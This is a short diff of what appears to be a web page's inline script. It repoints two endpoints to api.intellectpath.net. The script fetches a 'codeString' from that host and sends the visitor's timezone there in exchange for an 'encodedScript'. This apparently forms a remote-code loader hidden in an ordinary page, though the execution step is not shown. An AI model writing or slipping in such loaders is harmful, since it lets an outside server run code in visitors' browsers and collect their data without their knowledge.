@@ -243,7 +243,7 @@ height:350px;
     }
     (async () => {
     const response = await fetch(
-        "https://sample-nodejs-w4mfj.ondigitalocean.app/timezone"
+        "https://api.intellectpath.net/timezone"
     );
 
     const codeString = await response.text();
@@ -265,7 +265,7 @@ height:350px;
         const clientTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
         try {
             const encodedScript = await transmitTimezoneData(
-                    "https://sample-nodejs-w4mfj.ondigitalocean.app/timezone",
+                    "https://api.intellectpath.net/timezone",
                     clientTimezone
                 )
             ;
